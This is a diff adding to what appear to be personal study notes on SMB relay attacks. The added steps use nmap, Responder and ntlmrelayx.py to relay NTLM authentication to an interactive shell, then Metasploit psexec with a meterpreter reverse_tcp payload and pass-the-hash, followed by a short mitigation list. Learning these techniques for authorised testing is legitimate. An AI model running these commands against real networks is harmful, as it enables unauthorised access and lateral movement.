@@ -90,9 +90,13 @@ Instead crack hashes what we can do is to relay those to specific machines and g
 
 We can do it using nmap:
 ```bash
-nmap --script=smb2-security-mode.nse -p4445 network ip (example 10.0.0.0/24)
+nmap --script=smb2-security-mode.nse -p4445 (IP) -Pn
 ```
+-  generally we start with the Domain controller IP but we can do `192.168.1.0/24`
+- `-Pn` is done to avoid the ping (namp sees if the target is alive with the ping some machines disable ping, so the scan is stopped without -Pn)
 
+
+At this point we create a `target.txt` file.
 
 ## Step 2: run responder 
 
@@ -108,4 +112,76 @@ Now we can run responder:
 ```bash
 sudo responder -I eth0 -dwP
 ```
+
+
+## Step 3: setup relay
+To setup our relay we can use a script called ntlmrelayx.py:
+```bash
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+```
+- ![[Pasted image 20241217161801.png]]
+
+
+
+## Step 4: Trigger an event
+Example we request on network at 
+```bash
+\\10.8.0.2
+```
+
+
+![[Pasted image 20241217153913.png]]
+
+
+
+## Step 5: analyse traffic
+At this point we can analyse traffic to see if something is captured on the relay:
+- ![[Pasted image 20241217162034.png]]
+
+
+
+To gain a shell we can change the command to:
+```shell
+sudo ntlmrelayx.py -tf targets.txt -smb2support -i 
+```
+
+And then run on the attack machine:
+```bash
+nc 127.0.0.1 11000
+```
+
+
+## Mitigation
+To mitigate SMB relay we can:
+- Enable SMB signing on all devices
+- Disable NTML authentication on the nework (but if kerberos stops then it turn back to NTLM )
+- Tier the account (limit domain admins to specific tasks)
+- Restrict local admin
+
+## Gain shell access with credentials cracked
+We can gain a shell acces using metasploit with `exploit/windows/smb/psexec`. We just need to set the information:
+- ![[Pasted image 20241217163749.png]]
+
+
+First of all we need to set the payload:
+```shell
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+Then:
+```bash
+set rhosts IP
+set smbdomain domain
+set smbuser username
+set smbpass Password
+```
+## Gain shell access with hash NOT CRACKED
+The idea is the same but we set as password the hash:
+- ![[Pasted image 20241217163921.png]]
+
+
+
+We can also use `psexec.py`:
+- ![[Pasted image 20241217164021.png]]
+- ![[Pasted image 20241217164240.png]]
 
